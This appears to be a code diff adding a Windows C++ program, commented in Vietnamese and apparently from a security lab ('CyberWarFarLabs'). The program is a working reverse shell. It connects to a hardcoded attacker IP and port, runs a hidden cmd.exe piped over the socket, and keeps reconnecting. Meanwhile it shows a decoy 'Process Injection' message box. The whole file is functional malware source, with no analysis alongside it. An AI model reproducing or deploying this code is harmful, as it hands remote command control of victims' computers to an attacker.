@@ -1,0 +1,223 @@
+// Phải include winsock2.h TRƯỚC Windows.h để tránh xung đột
+#define WIN32_LEAN_AND_MEAN
+#define _WINSOCKAPI_
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <Windows.h>
+#include <stdio.h>
+#include <process.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+// Cấu hình reverse shell - thay đổi IP và Port tại đây
+#define ATTACKER_IP "192.168.1.2"
+#define ATTACKER_PORT 4444
+
+// Struct để truyền dữ liệu giữa các thread
+struct ShellData {
+	SOCKET sock;
+	HANDLE hChildStdin;
+	HANDLE hChildStdout;
+	HANDLE hChildStderr;
+};
+
+// Thread đọc từ socket và ghi vào cmd.exe stdin
+unsigned int __stdcall SocketToCmdThread(void* param) {
+	ShellData* data = (ShellData*)param;
+	char buffer[4096];
+	int bytesReceived;
+	DWORD bytesWritten;
+
+	while (TRUE) {
+		bytesReceived = recv(data->sock, buffer, sizeof(buffer) - 1, 0);
+		if (bytesReceived <= 0) {
+			break; // Socket đóng
+		}
+		
+		// Ghi vào stdin của cmd.exe
+		if (!WriteFile(data->hChildStdin, buffer, bytesReceived, &bytesWritten, NULL)) {
+			break; // Pipe đóng
+		}
+	}
+	return 0;
+}
+
+// Thread đọc từ cmd.exe stdout và ghi vào socket
+unsigned int __stdcall CmdToSocketThread(void* param) {
+	ShellData* data = (ShellData*)param;
+	char buffer[4096];
+	DWORD bytesRead;
+	int bytesSent;
+
+	while (TRUE) {
+		if (!ReadFile(data->hChildStdout, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
+			break; // Pipe đóng
+		}
+		
+		if (bytesRead == 0) {
+			continue;
+		}
+		
+		// Ghi vào socket
+		bytesSent = send(data->sock, buffer, bytesRead, 0);
+		if (bytesSent <= 0) {
+			break; // Socket đóng
+		}
+	}
+	return 0;
+}
+
+// Hàm reverse shell chạy trong thread riêng
+unsigned int __stdcall ReverseShellThread(void* param) {
+	WSADATA wsaData;
+	SOCKET sock;
+	struct sockaddr_in server;
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+	HANDLE hStdinRd, hStdinWr, hStdoutRd, hStdoutWr, hStderrRd, hStderrWr;
+	SECURITY_ATTRIBUTES sa;
+	ShellData shellData;
+	HANDLE hThread1, hThread2;
+
+	// Khởi tạo Winsock
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+		return 1;
+	}
+
+	// Loop để giữ reverse shell sống và tự động reconnect
+	while (TRUE) {
+		// Tạo socket
+		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+		if (sock == INVALID_SOCKET) {
+			Sleep(5000);
+			continue;
+		}
+
+		// Cấu hình địa chỉ server
+		server.sin_family = AF_INET;
+		server.sin_port = htons(ATTACKER_PORT);
+		InetPtonA(AF_INET, ATTACKER_IP, &server.sin_addr);
+
+		// Kết nối đến attacker (retry logic)
+		int connected = 0;
+		for (int i = 0; i < 10; i++) {
+			if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
+				connected = 1;
+				break;
+			}
+			Sleep(2000);
+		}
+
+		if (!connected) {
+			closesocket(sock);
+			Sleep(5000);
+			continue;
+		}
+
+		// Tạo pipe cho stdin, stdout, stderr
+		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+		sa.bInheritHandle = TRUE;
+		sa.lpSecurityDescriptor = NULL;
+
+		if (!CreatePipe(&hStdinRd, &hStdinWr, &sa, 0) ||
+			!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0) ||
+			!CreatePipe(&hStderrRd, &hStderrWr, &sa, 0)) {
+			closesocket(sock);
+			Sleep(5000);
+			continue;
+		}
+
+		// Đảm bảo read handles không được inherit
+		SetHandleInformation(hStdinWr, HANDLE_FLAG_INHERIT, 0);
+		SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);
+		SetHandleInformation(hStderrRd, HANDLE_FLAG_INHERIT, 0);
+
+		// Thiết lập thông tin process cho cmd.exe
+		ZeroMemory(&si, sizeof(si));
+		si.cb = sizeof(si);
+		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+		si.hStdInput = hStdinRd;
+		si.hStdOutput = hStdoutWr;
+		si.hStdError = hStderrWr;
+		si.wShowWindow = SW_HIDE;
+
+		// Tạo process cmd.exe
+		char cmdLine[] = "C:\\Windows\\System32\\cmd.exe /K";
+		if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+			CloseHandle(hStdinRd);
+			CloseHandle(hStdinWr);
+			CloseHandle(hStdoutRd);
+			CloseHandle(hStdoutWr);
+			CloseHandle(hStderrRd);
+			CloseHandle(hStderrWr);
+			closesocket(sock);
+			Sleep(5000);
+			continue;
+		}
+
+		// Đóng handles không cần thiết trong parent process
+		CloseHandle(hStdinRd);
+		CloseHandle(hStdoutWr);
+		CloseHandle(hStderrWr);
+
+		// Thiết lập dữ liệu cho threads
+		shellData.sock = sock;
+		shellData.hChildStdin = hStdinWr;
+		shellData.hChildStdout = hStdoutRd;
+		shellData.hChildStderr = hStderrRd;
+
+		// Tạo threads để bridge giữa socket và cmd.exe
+		hThread1 = (HANDLE)_beginthreadex(NULL, 0, SocketToCmdThread, &shellData, 0, NULL);
+		hThread2 = (HANDLE)_beginthreadex(NULL, 0, CmdToSocketThread, &shellData, 0, NULL);
+
+		// Đợi process hoặc threads kết thúc
+		WaitForSingleObject(pi.hProcess, INFINITE);
+
+		// Cleanup
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		CloseHandle(hStdinWr);
+		CloseHandle(hStdoutRd);
+		CloseHandle(hStderrRd);
+		if (hThread1) CloseHandle(hThread1);
+		if (hThread2) CloseHandle(hThread2);
+		closesocket(sock);
+		
+		Sleep(2000); // Đợi một chút trước khi reconnect
+	}
+
+	WSACleanup();
+	return 0;
+}
+
+// Thread hiển thị message box
+unsigned int __stdcall MessageBoxThread(void* param) {
+	Sleep(500); // Đợi một chút để reverse shell bắt đầu kết nối
+	MessageBoxA(0, "Hello From CyberWarFarLabs!!", "Process Injection", 0);
+	return 0;
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+{
+	// Tạo thread để chạy reverse shell ngầm TRƯỚC
+	HANDLE hReverseShellThread = (HANDLE)_beginthreadex(NULL, 0, ReverseShellThread, NULL, 0, NULL);
+	if (hReverseShellThread != NULL) {
+		CloseHandle(hReverseShellThread); // Đóng handle, thread vẫn chạy
+	}
+	
+	// Tạo thread riêng để hiển thị message box (không block main thread)
+	HANDLE hMsgBoxThread = (HANDLE)_beginthreadex(NULL, 0, MessageBoxThread, NULL, 0, NULL);
+	if (hMsgBoxThread != NULL) {
+		CloseHandle(hMsgBoxThread); // Đóng handle, thread vẫn chạy
+	}
+	
+	// Giữ process sống để reverse shell tiếp tục chạy
+	// Đợi vô hạn
+	while (TRUE) {
+		Sleep(1000); // Sleep 1 giây mỗi lần để không tốn CPU
+	}
+
+	return 0;
+}
+
